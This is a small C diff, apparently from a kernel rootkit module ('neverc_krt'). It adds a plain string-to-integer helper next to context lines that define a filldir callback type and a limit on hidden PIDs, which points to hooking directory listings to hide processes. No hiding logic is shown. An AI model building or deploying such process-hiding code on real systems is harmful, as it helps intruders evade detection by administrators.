@@ -8,6 +8,16 @@
 typedef int (*neverc_krt_filldir_fn)(void *ctx, const char *name, int namlen,
 				     long long offset, u64 ino, unsigned int type);
 
+static __always_inline int _neverc_krt_atoi(const char *s, int len)
+{
+	int val = 0, i;
+	for (i = 0; i < len; i++) {
+		if (s[i] < '0' || s[i] > '9') return -1;
+		val = val * 10 + (s[i] - '0');
+	}
+	return val;
+}
+
 /* ---- internal structs ---- */
 
 #define NEVERC_KRT_HIDE_PID_MAX 32
